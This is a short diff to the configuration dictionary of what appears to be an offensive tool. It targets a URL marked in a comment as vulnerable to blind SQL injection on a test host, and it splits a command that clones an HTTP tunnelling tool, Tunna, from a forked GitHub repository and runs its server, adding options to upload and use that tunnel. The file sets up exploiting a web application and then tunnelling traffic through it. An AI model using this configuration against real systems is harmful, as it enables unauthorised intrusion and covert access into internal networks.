@@ -5,7 +5,10 @@ config = {
     'vulnerable_url': 'http://admin.test.com/addnews.php?user_id=15',  # vul url contain blind sqli
     'script_name': 'shelln3#%n446nmn!#&*^',
     'interupt': 'n3#%n446nmn!#&*^',
-    'cmd': 'git clone https://github.com/SECFORCE/Tunna && python Tunna/webserver.py',
+    'git_clone_tunna': 'git clone https://github.com/sadekyo1712/Tunna',
+    'run_tunna_server': 'python Tunna/webserver.py',
+    'upload_tunna': False,
+    'use_tunna_server': True,
     'url_exploit': 'http://admin.test.com/addnews.php?user_id=15',
     'signal_str': 'Khanh Nguyen',
     'data': '',
@@ -20,4 +23,5 @@ config = {
     'Keep-Alive': '300',
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
+    'verbose': True,
 }
